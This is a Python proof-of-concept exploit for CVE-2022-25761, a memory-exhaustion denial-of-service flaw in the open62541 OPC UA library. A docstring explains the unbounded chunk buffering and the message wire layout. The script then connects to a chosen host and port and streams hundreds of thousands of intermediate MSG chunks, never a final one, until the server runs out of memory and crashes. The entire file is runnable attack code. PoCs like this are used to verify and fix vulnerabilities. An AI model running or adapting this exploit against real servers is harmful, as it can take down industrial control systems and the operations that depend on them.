#!/usr/bin/env python3
"""
PoC for CVE-2022-25761 - open62541 SecureChannel unbounded chunk DoS.

The harness drives the REAL vulnerable open62541 v1.2.4
UA_SecureChannel_processBuffer() with the genuine default config
(localMaxChunkCount=0, localMaxMessageSize=0) and a real SecurityPolicy#None
channel already OPEN (built FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION, like the
upstream fuzzer, so channelId/token/sequence checks are skipped).

We stream MSG chunks with chunkType 'C' (INTERMEDIATE) and NEVER send a 'F'
(FINAL) chunk. Each chunk is decrypted (no-op under None) and appended to
channel->decryptedChunks, which is never drained -> heap grows without bound
until the watchdog SIGABRTs / the container is OOM-killed.

MSG chunk wire layout (open62541 symmetric message):
  "MSG" + "C"            3+1  message type + chunk type
  u32 messageSize         4   total chunk size (>= 16)
  u32 secureChannelId     4
  u32 tokenId             4   (SymmetricAlgorithmSecurityHeader)
  u32 sequenceNumber      4   (SequenceHeader)
  u32 requestId           4
  body                    N
"""
import socket
import struct
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4840

BODY = 60000           # body bytes per chunk (chunk stays < 64 KiB recvBufferSize)
N_CHUNKS = 200000      # plenty to cross the 256 MB retained-bytes watchdog


def msg_chunk(seq: int) -> bytes:
    body = b"A" * BODY
    size = 8 + 16 + len(body)   # tcp hdr(8) + chan+token+seq+req(16) + body
    hdr = b"MSG" + b"C" + struct.pack("<I", size)
    sec = struct.pack("<IIII", 1, 1, seq, 1)  # channelId, tokenId, seqNum, reqId
    return hdr + sec + body


def main():
    print(f"[*] CVE-2022-25761 PoC -> {HOST}:{PORT}")
    print(f"[*] Streaming up to {N_CHUNKS} INTERMEDIATE MSG chunks, "
          f"never FINAL ({BODY} B body each)")
    s = socket.create_connection((HOST, PORT), timeout=10)
    sent = 0
    try:
        for i in range(N_CHUNKS):
            s.sendall(msg_chunk(i + 1))
            sent += 1
            if i % 500 == 0:
                approx = sent * BODY // (1024 * 1024)
                print(f"    sent {sent} chunks (~{approx} MB retained)")
                time.sleep(0.005)
    except (BrokenPipeError, ConnectionResetError, OSError) as e:
        print(f"[+] Connection dropped after {sent} chunks: {e}")
        print("[+] Server crashed (watchdog SIGABRT / OOM-kill) -> check docker logs")
        return
    print(f"[*] Sent all {sent} chunks; check server logs / RSS")


if __name__ == "__main__":
    main()
